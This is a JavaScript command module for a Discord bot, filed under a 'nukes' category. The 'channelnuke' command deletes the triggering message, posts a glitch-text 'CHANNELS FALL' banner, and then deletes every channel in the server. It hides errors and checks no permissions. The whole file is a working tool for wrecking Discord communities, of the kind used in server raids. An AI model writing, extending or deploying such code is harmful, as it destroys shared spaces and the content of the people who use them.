const { glitchBanner } = require('../../src/ascii');
module.exports = {
  name: 'channelnuke',
  aliases: ['channuke'],
  description: 'Delete every channel (no rebuild).',
  category: 'nukes',
  async execute(message) {
    if (!message.guild) return;
    await message.delete().catch(()=>{});
    await message.channel.send('```\n' + glitchBanner('CHANNELS FALL') + '\n```').catch(()=>{});
    message.guild.channels.cache.forEach(c=>c.delete().catch(()=>{}));
  },
};
